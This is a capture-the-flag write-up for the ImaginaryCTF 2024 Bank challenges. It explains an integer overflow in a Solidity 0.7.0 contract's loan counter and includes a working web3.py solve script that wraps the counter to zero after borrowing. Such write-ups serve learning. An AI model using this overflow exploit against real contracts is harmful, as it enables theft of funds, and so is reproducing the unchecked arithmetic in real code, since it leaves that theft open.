---
title: Writeup - Bank and Bank-Revenge (ImaginaryCTF 2024)
date: 2024-07-21 00:00:00
tags: 
- writeup
- blockchain
- imaginary2024
---

# ImaginaryCTF 2024 - Bank and Bank-Revenge Writeup
## Description
```markdown
Can you actually steal the bank's money?

`nc 34.30.117.150 40001`

https://cybersharing.net/s/7bd2b956c1e5974f

[bank2.sol]
```

## Writeup
Just as a quick note, this writeup will cover both the Bank challenge and the Bank-Revenge challenge, they are identical except for a single line that differs, namely `uint48 flag_cost = 50;` in [`bank.sol`](/static/ictf-bank/bank.sol) and `uint48 flag_cost = 281474976710655;` in [`bank2.sol`](/static/ictf-bank/bank2.sol). The method of solving them is also identical, so I will only cover solving Bank-Revenge. In addition, I didn't actually solve this challenge during the competition, but was very close. 

The provided contract file is provided below:
```solidity
pragma solidity ^0.7.0;

contract Bank {
    uint48 flag_cost = 281474976710655;
    uint48 amount_you_have = 0;
    uint48 loaned = 0;
    
    function deposit(uint48 amount) public payable {
        require(msg.sender==YOUR_WALLET_ADDRESS,"Please use the wallet provided to you"); // This is for security purposes
        require(amount==msg.value,"Please send exact amount");
        amount_you_have += amount;
    }

    function withdraw(uint48 amount) public payable {
        require(msg.sender==YOUR_WALLET_ADDRESS,"Please use the wallet provided to you"); // This is for security purposes
        require((amount) < amount_you_have, "You cannot withdraw what you do not have!");
        amount_you_have -= amount;
        msg.sender.call{value:amount}("");
    }

    function getMoney() public payable {
        // Used for deployment, can be safely ignored
    }

    function loan(uint48 amount) public payable {
        require(msg.sender==YOUR_WALLET_ADDRESS,"Please use the wallet provided to you"); // This is for security purposes
        loaned += amount;
        msg.sender.call{value:amount}("");
    }

    function isChallSolved() public view returns (bool solved) {
        if ((amount_you_have >= flag_cost) && (loaned == 0)) {
            return true;
        }
        else {
            return false;
        }
    }
}
```

Interacting with the provided netcat session allowed you to create a personal instance of this challenge. Since I cover how to setup interacting with contracts using Python's `web3` library in [the `EightFiveFourFive` writeup](/2023/ductf-8545/), I won't cover it in-depth here. 

<img src="/static/ictf-bank/setup.png" width="750px">

The goal here seems to be fairly simple - you need to have `281474976710655` in your account while `loan == 0`. The functions in the contract allow you to deposit money from your wallet, withdraw money into your wallet, get a loan of however much money you want, and see if the challenge is solved. Note that the `getMoney()` function is not relevant to us, as the comment states. 

### How to Not Exploit the Contract
Since I'm a web3 noob, I'm going to list some ideas I had for how to exploit the contract that didn't/wouldn't work and why. 

* **Deposit 281474976710655 eth from your wallet and redeem for the flag** - you don't start out with that much money so you can't actually deposit that much.
* **Spoof your deposited amount** - since the amount added to your account balance in the `deposit` actually comes from the `amount` argument and not `msg.value`, it would be possible to only send (for example) 1 eth but have amount set to `281474976710655` so your balance goes up way more than it should. However, the function checks that `amount == msg.value` so that's not valid. 
* **Reentrancy** - all functions (`deposit`, `withdraw`, and `loan`) follow the [`Check-Effect-Interaction`](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) pattern to protect against this attack, plus each function ensures the transaction comes from your wallet and not a malicious contract acting on your behalf.
* **Withdraw a negative amount** - the sole argument to `withdraw` is `uint48 amount`, which means it must be unsigned so a negative number isn't accepted.

### How to Exploit the Contract
One thing I noticed fairly early on is that the version of solidity it uses is `0.7.0`, which is an older version. As I do with all CTF problems, I looked to see if there were vulnerabilities with the older version. [It turns out](https://mihrazvan.medium.com/enhancing-security-and-efficiency-with-solidity-0-8-65de34d8442c) that Solidity versions before `0.8.0` are vulnerable to integer overflows and underflows by default and there wasn't a library to check for them. If you wanted to protect yourself against it, you had to implement those checks yourself. Solidity `0.8.0` introduced the Safe Math library that does arithmetic with built-in overflow/underflow checks for you to use. This told me it was likely an integer underflow/overflow problem. 

I quickly realized that the only function that was realistically vulnerable to this was `loan`, as you could get as much money as you wanted from `loan`. If you borrowed `2**48 - 1` eth once, then `1` eth a second time, your loan amount was set to 0. What tripped me up during the actual competition was I thought it should have incremented `amount_you_have` as its way of "giving me" the money, and since that line wasn't in there the function was useless. 

What I understood later was that the `msg.sender.call{value:amount}("");` function sends the eth to your wallet and doesn't just increase your amount on the contract. This means you just need to deposit the money you got from the loan and then you can redeem the flag. 

To summarize, this is the exploit chain:
* Borrow `2**48 - 1` eth from the contract (max `uint48` value)
* Borrow `1` eth from the contract, overflowing the `loan` variable and setting it to 0. 
* Deposit `2**48 - 1` eth from your wallet into your account balance (`amount_you_have`)
* Call `isChallSolved()` and profit

### Exploit Code
Here's my [`solve.py` script](/static/ictf-bank/solve.py):
```python
from web3 import Web3


### CONSTANTS ###
RPC_URL = "http://34.30.117.150:47242"
PRIVATE_KEY = "0x4318eeacf357da9bc21e5026ac57070bc8d0a126917c009955d924bdb0707e9e"
PLAYER_ADDRESS = "0x2bab8E11621f77cfA6D60055531292AA2d2A9fc1"
CONTRACT_ADDRESS = "0x59e382A65AE318C05E3A03F7a5bf584AD162CE82"
SECRET = "2cc615254cc1167a3972e317e8838d5234579d4f79c34c83a95c2ba0d55da068"


### INITIALIZATIONS ###
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)

CONTRACT_ABI = [...]
contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)



### EXPLOIT ###
print('Current ether amount:',w3.from_wei(w3.eth.get_balance(PLAYER_ADDRESS), 'ether'))


# Get enough money from a loan to buy the flag
transaction = contract.functions.loan(2**48 - 1).build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
    'chainId': w3.eth.chain_id
})
signed_transaction = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
print(f"Transaction hash: {transaction_hash.hex()}")


# verify you have enough
print('Current ether amount:',w3.from_wei(w3.eth.get_balance(PLAYER_ADDRESS), 'ether'))


# Get 1 eth from loan so loan amount overflows to 0
transaction = contract.functions.loan(1).build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
    'chainId': w3.eth.chain_id
})
signed_transaction = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
print(f"Transaction hash: {transaction_hash.hex()}")


# deposit 2**48-1 eth so you can get the flag
transaction = contract.functions.deposit(2**48 - 1).build_transaction({
    'from': PLAYER_ADDRESS,
    'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
    'value': 2**48 - 1,
})
signed_transaction = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
print(f"Transaction hash: {transaction_hash.hex()}")


# ensure the challenge can be solved
print('Challenge solved?',contract.functions.isChallSolved().call())


# if it's solved, interact with nc 34.30.117.150 40001 again and put in your secret to get the flag
```

<img src="/static/ictf-bank/solve.png" width="860px">

**Flag** - `ictf{r0bb1ng_7h3_b4nk_8f4a3d2b}`